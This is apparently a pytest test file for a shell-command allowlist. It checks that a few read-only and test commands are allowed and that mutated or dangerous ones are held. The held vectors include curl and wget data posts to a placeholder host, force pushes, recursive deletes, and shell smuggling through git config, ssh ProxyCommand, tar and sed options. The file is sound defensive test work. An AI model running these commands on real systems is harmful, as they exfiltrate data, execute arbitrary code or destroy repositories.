from dataclasses import replace
from itertools import product
from random import Random
from time import perf_counter

import pytest

from archeus.core.execution.command_allowlist import (
    MAX_INPUT_LENGTH, ROWS, Allowed, Held, PathEvidence, Reason, TrustedContext, classify,
)


CONTEXT = TrustedContext(
    posix_shell=True,
    programs=frozenset(row.program for row in ROWS),
    git_profile=True,
    paths={
        'file.txt': PathEvidence('file', True),
        'two words.txt': PathEvidence('file', True),
        '.': PathEvidence('directory', True, True),
        'tests': PathEvidence('directory', True, True),
    },
)
VECTORS = (
    ('A01', 'pwd'),
    ('A02', 'ls -a -l .'),
    ('A03', 'cat file.txt'),
    ('A04', 'head -n 20 file.txt'),
    ('A05', 'tail -n 20 file.txt'),
    ('A06', 'wc -l file.txt'),
    ('A07', 'rg --no-config --fixed-strings --line-number -- "some text" tests'),
    ('A08', 'git --no-pager status --porcelain=v1'),
    ('A09', 'git --no-pager diff --no-ext-diff --no-textconv --cached -- file.txt'),
    ('A10', 'git --no-pager log --max-count=20 --oneline HEAD'),
    ('A11', 'git --no-pager show --no-ext-diff --no-textconv HEAD'),
    ('A12', 'git --no-pager ls-files -- file.txt'),
    ('A13', 'git --no-pager rev-parse --show-toplevel'),
    ('A14', 'pytest -q tests'),
    ('A15', 'python -m pytest -q tests'),
    ('A16', 'node --version'),
)


@pytest.mark.parametrize('row_id,command', VECTORS)
def test_each_row(row_id, command):
    result = classify(command, CONTEXT)
    assert isinstance(result, Allowed)
    assert result.row_id == row_id
    assert result.status == 'ALLOWED'
    assert result.action_class == ('exec' if row_id in ('A14', 'A15', 'A16') else 'read')


def test_table_inventory():
    assert [row.id for row in ROWS] == [f'A{i:02}' for i in range(1, 17)]
    assert {row.program for row in ROWS}.isdisjoint({'curl', 'wget'})


@pytest.mark.parametrize('row', ROWS, ids=lambda row: row.id)
def test_every_complete_option_vector(row):
    operands = {
        'none': '', 'P*': 'tests', 'F+': 'file.txt',
        'search': '-- needle tests', 'optional_paths': '-- file.txt',
        'optional_head': 'HEAD', 'head': 'HEAD',
    }
    for options in row.options:
        command = ' '.join((row.program, *row.prefix, *options, operands[row.operands])).strip()
        assert isinstance(classify(command, CONTEXT), Allowed), command


@pytest.mark.parametrize('row_id,command', VECTORS)
@pytest.mark.parametrize('mutation', (
    lambda s: s + ' --extra',
    lambda s: s + ' {}',
    lambda s: s + ' *',
    lambda s: s + ' > file.txt',
    lambda s: s + ' $(pwd)',
    lambda s: 'X=1 ' + s,
    lambda s: s + '\npwd',
    lambda s: s + '\u0085',
    lambda s: s.replace(' ', '.exe ', 1) if ' ' in s else s + '.exe',
    lambda s: s.replace(' ', '.cmd ', 1) if ' ' in s else s + '.cmd',
    lambda s: './' + s,
    lambda s: '/bin/' + s,
    lambda s: 'C:\\tools\\' + s,
    lambda s: s.split(' ', 1)[0][:-1] + (' ' + s.split(' ', 1)[1] if ' ' in s else ''),
))
def test_per_row_near_misses(row_id, command, mutation):
    assert isinstance(classify(mutation(command), CONTEXT), Held)


@pytest.mark.parametrize('command', (
    'ls -la .', 'ls -l -a .', 'ls -a -a .', 'ls --all .',
    'head -n20 file.txt', 'head -n 2 file.txt', 'tail -f file.txt',
    'wc -lc file.txt', 'rg --no-conf --fixed-strings -- needle tests',
    'rg --fixed-strings --no-config -- needle tests',
    'git --no-pager stat', 'git --no-pager status --porc',
    'git --no-pager diff --no-ext-diff --no-textconv --sta',
    'git --no-pager log --max-count=2', 'git --no-pager log --max-count=20 main',
    'git --no-pager show --no-ext-diff --no-textconv main',
    'git --no-pager ls-files file.txt', 'git --no-pager rev-parse --show-top',
    'pytest -qq tests', 'python -m pytest -qq tests', 'node --ver',
    'py -m pytest', 'python3 -m pytest', 'python3.11 -m pytest',
    'PWD', 'cmd /c pwd', 'powershell pwd', 'pwsh pwd',
    "'pwd'", 'p""wd', 'ls "-l" .', 'ls -""l .',
    'cat ""', 'cat "file.txt', 'cat file.txt""', "cat 'file\".txt'",
    'cat -', 'cat ../file.txt', 'cat /file.txt', 'cat a//b', 'cat file.txt/',
    'cat @file.txt', 'cat file.txt:stream', 'cat https://x',
    'cat " file.txt"', 'cat "file.txt "', 'cat tests',
    'rg --no-config --fixed-strings -- "x|y" tests',
    'rg --no-config --fixed-strings -- "x=y" tests',
    'rg --no-config --fixed-strings -- needle',
    'git --no-pager diff --no-ext-diff --no-textconv --',
    'env pwd', 'X=1 pwd', 'pwd\r', 'pwd\x00', 'pwd\x7f', 'pwd\u00a0',
))
def test_grammar_and_exact_options(command):
    assert isinstance(classify(command, CONTEXT), Held)


@pytest.mark.parametrize('command', (
    'git push --{},force} origin main', 'rm -{},R} build',
    'git branch -{},D} x', 'find . -{},delete}',
    'sed \'s/' + '\\a' * 26 + "' f",
    'sed \'s/' + 'a\\/' * 4000 + "/b/' f",
    'rm --r build', 'rm --rec build', 'rm --recursiv build',
    'git branch --d x', 'git branch --del x', 'git branch -vd x',
    'git branch -fD x', 'git --u x', 'git ls-remote --u x ./nonexist',
    'git clone --u x URL', 'git push --m origin', 'git push --e x origin main',
    "sed --expr='e x' f", 'tar --rmt=mytool -cf h:a b', 'man --pa=x f',
    'curl -sd x https://h.example/x', 'curl -fsSLd x URL', 'curl -vXPOST URL',
    'wget -e use_askpass=mytool https://h.example/x',
    'wget -euse_askpass=mytool URL', 'wget -qe use_askpass=mytool URL',
    'npm pu', 'npm pub', 'npm publ', 'npm publi', 'npm inst x',
))
def test_six_required_review_families(command):
    start = perf_counter()
    assert isinstance(classify(command, CONTEXT), Held)
    assert perf_counter() - start < 0.25


@pytest.mark.parametrize('command', (None, 1, [], '', ' \t'))
def test_invalid_input(command):
    assert isinstance(classify(command, CONTEXT), Held)


def test_budget_and_linear_adversarial_scan():
    command = 'cat ' + 'a' * (100000 - 4)
    start = perf_counter()
    assert isinstance(classify(command, CONTEXT), Held)
    assert perf_counter() - start < 0.25
    assert classify('x' * (MAX_INPUT_LENGTH + 1), CONTEXT) == Held(Reason.BUDGET)
    assert classify('x' * MAX_INPUT_LENGTH, CONTEXT).reason != Reason.BUDGET


def test_context_is_required_and_bound_to_program():
    assert classify('pwd') == Held(Reason.CONTEXT)
    assert classify('pwd', TrustedContext()) == Held(Reason.CONTEXT)
    assert classify('pwd', replace(CONTEXT, posix_shell=False)) == Held(Reason.CONTEXT)
    assert classify('pwd', replace(CONTEXT, programs=frozenset({'git'}))) == Held(Reason.CONTEXT)
    assert classify('git --no-pager status', replace(CONTEXT, git_profile=False)) == Held(Reason.CONTEXT)


@pytest.mark.parametrize('evidence', (
    None, PathEvidence('file'), PathEvidence('directory', True),
    PathEvidence('directory', False, True),
))
def test_unknown_or_unsafe_path_evidence(evidence):
    paths = {} if evidence is None else {'tests': evidence}
    assert classify('ls tests', replace(CONTEXT, paths=paths)) == Held(Reason.PATH)
    assert classify('ls tests', replace(CONTEXT, paths=None)) == Held(Reason.PATH)


def test_typed_operands_and_normalization():
    result = classify('rg --no-config --fixed-strings -- needle ./tests', CONTEXT)
    assert isinstance(result, Allowed)
    assert result.paths == ('tests',)
    assert classify('cat "two words.txt"', CONTEXT).paths == ('two words.txt',)
    assert classify('cat ./file.txt', CONTEXT).paths == ('file.txt',)
    assert classify('pwd\t', CONTEXT).row_id == 'A01'


def test_unquoted_metacharacter_property():
    # Exhaust every insertion boundary, row and forbidden metacharacter, including quoted operand boundaries.
    metacharacters = '$`\\{}*?[]~%!|;&<>()#'
    for (_, command), char in product(VECTORS, metacharacters):
        for index in range(len(command) + 1):
            prefix = command[:index]
            if prefix.count('"') % 2:
                continue
            mutated = prefix + char + command[index:]
            assert isinstance(classify(mutated, CONTEXT), Held), mutated


@pytest.mark.parametrize('char', '$`\\{}*?[]~%!')
def test_always_forbidden_even_inside_quotes(char):
    assert isinstance(classify(f'rg --no-config --fixed-strings -- "x{char}y" tests', CONTEXT), Held)



def test_generated_unquoted_metacharacter_property():
    random = Random(128)
    alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789 -_=./\t'
    for _ in range(1000):
        text = ''.join(random.choices(alphabet, k=random.randrange(200)))
        index = random.randrange(len(text) + 1)
        char = random.choice('$`\\{}*?[]~%!|;&<>()#')
        assert isinstance(classify(text[:index] + char + text[index:], CONTEXT), Held)


def test_implicit_listing_directory_needs_evidence():
    assert classify('ls', replace(CONTEXT, paths={})) == Held(Reason.PATH)
    assert isinstance(classify('ls ./', CONTEXT), Allowed)


@pytest.mark.parametrize('command', (
    'ls', 'pytest', 'python -m pytest',
    'git --no-pager diff --no-ext-diff --no-textconv',
    'git --no-pager log --max-count=20', 'git --no-pager ls-files',
))
def test_optional_operands_can_be_absent(command):
    assert isinstance(classify(command, CONTEXT), Allowed)

@pytest.mark.parametrize('command', (
    'node -r ts-node/register x.ts', 'py -E x.py', 'python -E x.py',
    'ls *.py', 'curl -v https://h.example/x', 'npm run start', 'tar -cf a b',
    'find . -exec rm {} +',
))
def test_retired_permissive_mutant_inputs_stay_held(command):
    assert isinstance(classify(command, CONTEXT), Held)


@pytest.mark.parametrize('command', (
    'git -C . reset --hard', 'python3.11 -c x', 'python.bat -c x', 'rm.cmd -R x',
    'env pwd', 'mytool', 'ls la .', 'head -n file.txt',
    'cat', 'pwd extra', 'pwd\n', 'pwd\x01', 'p""wd',
))
def test_new_guard_mutation_witnesses(command):
    context = replace(CONTEXT, programs=CONTEXT.programs | {command.split()[0]})
    assert isinstance(classify(command, context), Held)


def test_pattern_is_never_path_with_matching_evidence():
    paths = dict(CONTEXT.paths, needle=PathEvidence('file', True))
    result = classify('rg --no-config --fixed-strings -- needle tests', replace(CONTEXT, paths=paths))
    assert isinstance(result, Allowed)
    assert result.paths == ('tests',)


@pytest.mark.parametrize('command', (
    pytest.param('wget --post-data=x https://h.example/x', id='Z153'),
    pytest.param('powershell -C x', id='Z154'),
    pytest.param('command ls', id='Z155'),
    pytest.param('curl --request=POST https://h.example/x', id='Z170'),
    pytest.param('curl -dx=1 https://h.example/x', id='Z171'),
    pytest.param('curl -XPOST https://h.example/x', id='Z172'),
    pytest.param('stdbuf -oL ls', id='Z178'),
    pytest.param('pwsh -Commandx', id='Z179'),
    pytest.param('cmd /C x', id='Z180'),
    pytest.param('node -p x', id='Z181'),
    pytest.param('sh -cC x', id='Z182'),
    pytest.param('node --eval=x', id='Z191'),
    pytest.param('python file.py -c x', id='Z192'),
    pytest.param('pwsh -cRemove-Item x', id='Z201'),
    pytest.param('bash -o pipefail -c x', id='Z202'),
    pytest.param('powershell -CommandWrite-Output x', id='Z203'),
    pytest.param('setarch uname -R ls', id='Z210'),
    pytest.param('git --unknown-flag status', id='Z216'),
    pytest.param('git -c core.pager=sh status', id='Z218'),
    pytest.param('wsl ls', id='Z220'),
    pytest.param('mytool --shell sh', id='Z221'),
    pytest.param('cmd /s/c x', id='Z223'),
    pytest.param('gdb -batch ls', id='Z224'),
    pytest.param('ksh -c x', id='Z227'),
    pytest.param('pythonw -m pytest', id='Z228'),
    pytest.param('rg --no-config --fixed-strings --pre mytool -- word .', id='Z232'),
    pytest.param('git rebase --exec sh', id='Z233'),
    pytest.param('git config core.pager sh', id='Z234'),
    pytest.param('sed s/a/b/e', id='Z237'),
    pytest.param('sort --compress-program pigz f', id='Z238'),
    pytest.param('rsync --rsh sh a h:b', id='Z239'),
    pytest.param('find . -delete', id='Z240'),
    pytest.param('tar -I pigz -cf a.tar d', id='Z245'),
    pytest.param('node --import=data:text/javascript,x', id='Z246'),
    pytest.param('git config filter.x.process sh', id='Z247'),
    pytest.param('git push -fu origin main', id='Z248'),
    pytest.param('git push origin +main', id='Z249'),
    pytest.param('tar -IF mytool -cf a.tar d', id='Z253'),
    pytest.param('tar --info-script mytool -cf a.tar d', id='Z254'),
    pytest.param('gtar -I pigz -cf a.tar d', id='Z255'),
    pytest.param('sftp -D /usr/lib/sftp-server h', id='Z256'),
    pytest.param('git clone --config-hook sh https://h.example/r', id='Z257'),
    pytest.param('git clone --upload-pack sh https://h.example/r', id='Z258'),
    pytest.param('iex x', id='Z259'),
    pytest.param('git config remote.o.uploadpack sh', id='Z261'),
    pytest.param('git config mergetool.m.cmd sh', id='Z262'),
    pytest.param('git config interactive.diffFilter sh', id='Z263'),
    pytest.param('git config web.browser sh', id='Z264'),
    pytest.param('tar cIf mytool a.tar', id='Z265'),
    pytest.param('tar cIf mytool a.tar d', id='Z269'),
    pytest.param('tar --to-command sh -cf a.tar d', id='Z270'),
    pytest.param('git clone -u sh https://h.example/r', id='Z271'),
    pytest.param('git fetch ext::sh -c x url', id='Z272'),
    pytest.param('git config protocol.x.allow sh', id='Z273'),
    pytest.param('git config url.ssh://x.insteadOf y', id='Z274'),
    pytest.param('git rebase -ix 10 sh', id='Z275'),
    pytest.param('git rebase --exe sh', id='Z276'),
    pytest.param('git push --delete origin x', id='Z277'),
    pytest.param('ssh -o ProxyCommand=sh h', id='Z280'),
    pytest.param('ssh -o ProxyCommand mytool h', id='Z282'),
    pytest.param('sftp -S sh h', id='Z283'),
    pytest.param('php -E x.php', id='Z284'),
    pytest.param('php --run x', id='Z285'),
    pytest.param('rg --no-config --fixed-strings --hostname-bin x -- word .', id='Z286'),
    pytest.param('bsdtar -cf a.tar d', id='Z287'),
    pytest.param('wget --execute x=y https://h.example/x', id='Z290'),
    pytest.param('ssh -vo ProxyCommand=sh h', id='Z291'),
    pytest.param('git --confi core.pager=sh status', id='Z293'),
    pytest.param('git clone --exec sh https://h.example/r', id='Z294'),
))
def test_redefined_missing_rows(command):
    context = replace(CONTEXT, programs=CONTEXT.programs | {command.split()[0]})
    assert isinstance(classify(command, context), Held)
